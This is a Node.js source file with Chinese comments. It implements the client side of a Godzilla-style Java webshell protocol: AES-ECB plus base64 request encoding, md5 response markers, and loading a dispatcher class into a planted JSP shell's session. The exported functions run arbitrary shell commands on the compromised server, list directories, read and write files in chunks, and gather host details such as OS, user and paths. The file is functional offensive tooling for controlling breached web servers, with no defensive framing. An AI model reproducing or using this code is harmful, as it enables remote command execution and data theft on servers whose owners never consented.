// 哥斯拉型 Java 通道（godzilla-java，JAVA_AES_BASE64 形态）：
//   key = md5(密钥源)[0:16]（AES-128-ECB）；pass = POST 字段名（连接密码字段复用）
//   请求体 = `pass=URL编码(base64(AES(载荷)))`（单行；初始化=class 字节，后续调用=gzip(Parameter 序列化)）
//   响应 = md5(pass+key)[0:16] + base64(AES(gzip(Parameter 序列化))) + md5(pass+key)[16:32]（hex 大写）
// 马侧契约：首请求 defineClass 存 session；后续 request.setAttribute("parameters", 解密体) →
//   equals(ByteArrayOutputStream)/equals(request)/equals(pageContext) → toString() 执行。
// 实现策略：自有会话态 dispatcher（WsmG，方法分派 probe/cmd/ls/read/write），不嵌外部载荷。
// 会话：JSESSIONID 由 http-client 按连接 scope 维护；连接删除/编辑后 invalidate 重初始化。

import { gzipSync, gunzipSync } from "node:zlib";
import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex, cookieHeaderFor, absorbCookies, clearCookies } from "./http-client.js";
import { JAVA_PAYLOADS } from "./payloads-java.js";
import { shapeHeaders, stripResponse } from "./profile.js";

const inited = new Map(); // scope → boolean（dispatcher 已装入 session）

const keyOf = (conn) => md5hex(String(conn.secret_key ?? conn.password ?? "")).slice(0, 16);
const markersOf = (conn) => {
	const hex = md5hex(String(conn.password ?? "pass") + keyOf(conn)).toUpperCase();
	return [hex.slice(0, 16), hex.slice(16, 32)];
};

/** Parameter 序列化：key + 0x02 + int32LE(len) + value。 */
export function serializeParams(obj) {
	const parts = [];
	for (const [k, v] of Object.entries(obj)) {
		const val = Buffer.isBuffer(v) ? v : Buffer.from(String(v ?? ""), "utf8");
		const len = Buffer.alloc(4);
		len.writeInt32LE(val.length);
		parts.push(Buffer.from(k, "utf8"), Buffer.from([2]), len, val);
	}
	return Buffer.concat(parts);
}

/** Parameter 反序列化 → {key: Buffer}。 */
export function parseParams(buf) {
	const out = {};
	let o = 0;
	while (o < buf.length) {
		const sep = buf.indexOf(2, o);
		if (sep === -1) break;
		const key = buf.subarray(o, sep).toString("utf8");
		const len = buf.readInt32LE(sep + 1);
		o = sep + 5 + len;
		if (o > buf.length) break;
		out[key] = buf.subarray(sep + 5, o);
	}
	return out;
}

function enc(key, plain) {
	const c = createCipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([c.update(plain), c.final()]);
}

function dec(key, cipher) {
	const d = createDecipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([d.update(cipher), d.final()]);
}

// 会话作用域必须绑定目标 URL——同协议探测不同马时，前一会话凭据（nonce/通行证）
// 不得串扰后一目标（曾致跨马协商失败与解密垃圾）
const scopeOf = (conn) => (conn.__scope ?? conn.id ?? conn.url) + "@" + String(conn.url ?? "");

/** 裸发送（init 专用——马侧首请求只装类不回显，无标记无加密体，不做响应解析）。 */
async function postRaw(conn, bodyBuffer) {
	const key = keyOf(conn);
	const pass = String(conn.password ?? "pass") || "pass";
	const scope = scopeOf(conn);
	const body = pass + "=" + encodeURIComponent(b64(enc(key, bodyBuffer)));
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: shapeHeaders(conn, {
			"content-type": "application/x-www-form-urlencoded",
			...(cookieHeaderFor(scope) ? { cookie: cookieHeaderFor(scope) } : {}),
			...(conn.headers ?? {})
		}),
		body,
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(scope, res.headers);
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——密码/密钥源不符或马不存在）`);
	return res;
}

async function post(conn, bodyBuffer) {
	const key = keyOf(conn);
	const res = await postRaw(conn, bodyBuffer);
	const text = stripResponse(conn, res.bodyBuffer.toString("utf8"));
	const [left, right] = markersOf(conn);
	const li = text.indexOf(left), ri = text.lastIndexOf(right);
	if (li === -1 || ri === -1 || ri <= li) throw new Error("响应缺 md5 标记——密钥源可能不匹配");
	const b64mid = text.slice(li + left.length, ri).trim();
	let out;
	try { out = dec(key, unb64(b64mid)); } catch { throw new Error("响应解密失败——密钥源可能不匹配"); }
	try { out = gunzipSync(out); } catch { /* 非 gzip 容错直通 */ }
	return out;
}

/** 确保 dispatcher 已装入 session（每 scope 一次）。 */
async function ensureInit(conn) {
	const scope = scopeOf(conn);
	if (inited.get(scope)) return;
	await postRaw(conn, Buffer.from(JAVA_PAYLOADS.WsmG, "base64"));
	if (!/JSESSIONID/i.test(cookieHeaderFor(scope) ?? "")) throw new Error("初始化失败：未建立会话（密码/密钥源可能不符）");
	inited.set(scope, true);
}

/** 调用 dispatcher 方法 → {status, o:Buffer}。 */
export async function call(conn, method, params = {}) {
	await ensureInit(conn);
	const payload = serializeParams({ methodName: method, ...params });
	const out = await post(conn, gzipSync(payload));
	const r = parseParams(out);
	const status = r.status?.toString("utf8") ?? "";
	if (status === "err") throw new Error(`载荷执行失败：${r.o?.toString("utf8") ?? ""}`);
	return r.o ?? Buffer.alloc(0);
}

export async function runCommand(conn, command, cwd = "") {
	return (await call(conn, "cmd", { c: command, d: cwd })).toString("utf8");
}

export async function fetchInfo(conn) {
	const token = "WSGG" + Math.random().toString(36).slice(2, 10).toUpperCase();
	const out = (await call({ ...conn, timeoutMs: Math.min(conn.timeoutMs || 8000, 8000) }, "probe", { t: token })).toString("utf8");
	if (!out.startsWith("WSM1|" + token)) return null;
	const f = out.split("|");
	return { token, osName: f[2] ?? "", user: f[3] ?? "", home: f[4] ?? "", userDir: f[5] ?? "", java: f[6] ?? "", cpus: f[7] ?? "", realPath: f[8] ?? "" };
}

export async function listDir(conn, path) {
	return JSON.parse((await call(conn, "ls", { p: path })).toString("utf8"));
}

export async function readFile(conn, path) {
	return unb64((await call(conn, "read", { p: path })).toString("utf8"));
}

export async function writeFile(conn, path, data) {
	// Parameter 值为字节流——直接承载原始分块（不占 Utf8 常量，分块只为单请求体量可控）
	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
	const CHUNK = 128 * 1024;
	let off = 0, first = true;
	do {
		const chunk = buf.subarray(off, off + CHUNK);
		const r = await call(conn, "write", first ? { p: path, b: chunk } : { p: path, b: chunk, m: "a" });
		if (!r.toString("utf8").startsWith("OK")) throw new Error(`马侧写入失败：${r.toString("utf8")}`);
		off += CHUNK;
		first = false;
	} while (off < buf.length);
	return { ok: true, size: buf.length };
}

const probeToken = () => "WSGG" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const info = await fetchInfo(conn);
		if (!info) { invalidate(scopeOf(conn)); return null; }
		return { tokenOutput: "WSM1", basicInfo: info };
	} catch (e) {
		if (process.env.WSM_DEBUG) console.error("[gjava-probe]", e.message);
		invalidate(scopeOf(conn));
		return null;
	}
}

/** 探测缓存清理（连接删除/编辑后）——会话废弃连 cookie 一起清。 */
export function invalidate(scope) {
	if (scope !== undefined) { inited.delete(scope); clearCookies(scope); }
	else { inited.clear(); }
}

export const godzillaJavaCodec = {
	id: "godzilla-java",
	label: "哥斯拉型通道（JSP·JAVA_AES_BASE64）",
	langs: ["jsp"],
	caps: { cmd: true, code: false, b64rw: true },
	call
};
